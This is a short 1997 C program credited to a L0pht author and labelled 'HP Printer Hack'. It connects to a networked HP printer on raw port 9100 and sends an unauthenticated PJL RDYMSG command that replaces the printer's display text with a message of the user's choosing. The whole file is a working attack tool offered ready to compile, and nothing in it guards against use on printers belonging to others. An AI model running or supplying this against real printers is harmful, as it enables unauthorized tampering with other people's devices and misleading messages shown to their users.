/* 
   HP Printer Hack
   12/8/97 sili@l0pht.com

   Compile with -lsocket -lnsl on solaris. 
   Should compile fine on *BSD & linux.

   
*/

#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdio.h>

#define PORT 9100

int main (int argc, char *argv[]) {

  int sockfd,len,bytes_sent;   /* Sock FD */
  struct hostent *host;   /* info from gethostbyname */
  struct sockaddr_in dest_addr;   /* Host Address */
  char line[100];
  
  if (argc !=3) {
    printf("HP Display Hack\n--sili@l0pht.com 12/8/97\n\n%s printer \"message\"\n",argv[0]);
    printf("\tMessage can be up to 16 characters long (44 on 5si's)\n");
    exit(1);
  }

  if ( (host=gethostbyname(argv[1])) == NULL) {
    perror("gethostbyname");
    exit(1);
  }

  printf ("HP Display hack -- sili@l0pht.com\n");
  printf ("Hostname:   %s\n", argv[1]);
  printf ("Message: %s\n",argv[2]);

  /* Prepare dest_addr */
  dest_addr.sin_family= host->h_addrtype;  /* AF_INET from gethostbyname */
  dest_addr.sin_port= htons(PORT) ; /* PORT defined above */

  /* Prepare dest_addr */
  bcopy(host->h_addr, (char *) &dest_addr.sin_addr, host->h_length);

  bzero(&(dest_addr.sin_zero), 8);  /* Take care of  sin_zero  ??? */
  
  
  /* Get socket */
/*  printf ("Grabbing socket....\n"); */
  if ((sockfd=socket(AF_INET,SOCK_STREAM,0)) < 0) {
    perror("socket");
    exit(1);
  }

  /* Connect !*/

  printf ("Connecting....\n");
  
  if (connect(sockfd, (struct sockaddr *)&dest_addr,sizeof(dest_addr)) == -1){
    perror("connect");
    exit(1);}

  /* Preparing JPL Command */
  
  strcpy(line,"\033%-12345X@PJL RDYMSG DISPLAY = \"");
  strncat(line,argv[2],44);
  strcat(line,"\"\r\n\033%-12345X\r\n");

  /* Sending data! */

/*  printf ("Sending Data...%d\n",strlen(line));*/
/*  printf ("Line: %s\n",line); */
  bytes_sent=send(sockfd,line,strlen(line),0);
  
  printf("Sent %d bytes\n",bytes_sent);
  close(sockfd);
}

      
       
  
  

